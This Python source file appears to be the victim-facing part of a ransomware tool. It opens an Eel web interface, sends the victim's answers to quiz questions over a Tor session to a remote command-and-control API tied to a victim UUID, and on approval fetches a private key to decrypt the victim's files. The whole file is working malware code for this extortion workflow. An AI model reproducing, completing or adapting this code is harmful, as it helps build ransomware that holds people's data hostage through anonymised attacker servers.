import json
import base64
import collections
from Helper import Helper
from TorManager import TorManager
import Config
import DecryptThread
import requests
import eel

uuid = ""

def setup():
     eel.init('web')      

def show():
    web_app_options = {
	'mode': "chrome-app",
	'port': 1337,
    'chromeFlags': [" --incognito"]
    }
    try:
        eel.start('ui.html', size=(1152,648), options=web_app_options)
    except EnvironmentError:
        web_app_options = {
	        'mode': "l33t",
	        'port': 1337
        }
        eel.start('ui.html', size=(1152,648), options=web_app_options)

@eel.expose                         # Expose this function to Javascript
def shutdown():
    h = Helper()
    h.safe_exit()

@eel.expose
def getQuestions():
    h = Helper()
    l = []
    with open(h.path('res/questions.txt'), 'r') as f:
        for q in f:
            l.append(q)
    return l

@eel.expose
def checkQuestions(answers):
    q = []
    for i in range(len(answers)):
        r = answers[i]
        tmp = [getQuestions()[i].replace('\n', ''), base64.b64encode(str(r).encode('utf-8'))]
        q.append(tmp)
    return sendAnswers(q)

def sendAnswers(q):
    tor = TorManager()
    r = tor.getSession()
    try:
        data = collections.OrderedDict()
        for i in range(0, len(q)):
            data[q[i][0]] = q[i][1].decode('utf-8')
        headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}
        req = r.post(Config.API_URL + "/answer/" + uuid, data=json.dumps(data), headers=headers)
        data = json.loads(req.text)
        if data['STATUS'] == "WRONG_ANSWERS":
            return False
        elif data['STATUS'] == "OK":
            return True
    except requests.exceptions.RequestException:
        return False

@eel.expose
def decryptData():
    tor = TorManager()
    r = tor.getSession()
    try:
        req = r.get(Config.API_URL + "/decrypt/" + uuid)
        data = json.loads(req.text)
        if data['STATUS'] == "FAIL":
            eel.decrypt_fail()
        elif data['STATUS'] == "SUCCESS":
            privkey = base64.b64decode(data['priv_key']).decode('utf-8')
            decryptThread = DecryptThread.DecryptThread(privkey, eel)
            decryptThread.start()
            decryptThread.join()
    except requests.exceptions.RequestException:
        eel.decrypt_fail()

